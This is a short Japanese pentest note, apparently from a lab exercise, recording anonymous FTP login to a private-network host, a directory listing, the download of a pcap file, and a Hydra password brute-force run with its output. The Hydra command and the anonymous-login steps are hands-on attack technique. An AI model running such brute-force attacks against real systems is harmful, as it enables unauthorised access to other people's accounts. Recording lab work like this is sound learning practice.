〇Anonymousログイン

ftp 192.168.0.101

Connected to 192.168.0.101.

220 (vsFTPd 3.0.2)

Name (192.168.0.101:kali): Anonymous

331 Please specify the password.

Password:*password*

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ログイン成功　anonymousであれば何でもログインできるよう

〇探索

ftp> ls

229 Entering Extended Passive Mode (|||63337|).

150 Here comes the directory listing.

-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap

226 Directory send OK.

〇ダウンロード

ftp> get lol.pcap

local: lol.pcap remote: lol.pcap

229 Entering Extended Passive Mode (|||30632|).

150 Opening BINARY mode data connection for lol.pcap (8068 bytes).

100% |***************************************************************************|  8068        1.08 MiB/s    00:00 ETA

226 Transfer complete.

8068 bytes received in 00:00 (776.01 KiB/s)

〇ブルートフォース

hydra -l ftp -P /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt 192.168.0.101 ftp

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-15 13:49:12

\[DATA\] max 16 tasks per 1 server, overall 16 tasks, 197 login tries (l:1/p:197), ~13 tries per task

\[DATA\] attacking ftp://192.168.0.101:21/

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: picture1

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 123456789

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: password

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 12345678

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: qwerty

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 123456

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: senha

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: abc123

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 111111

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 123123

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 1234567

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 1234

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 12345

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: Million2

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 1234567890

\[21\]\[ftp\] host: 192.168.0.101   login: ftp   password: 000000

1 of 1 target successfully completed, 16 valid passwords found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-15 13:49:13

![[ftpの調査 image 1.png]]

特に有力な情報はなし

〇その他は特に発見できず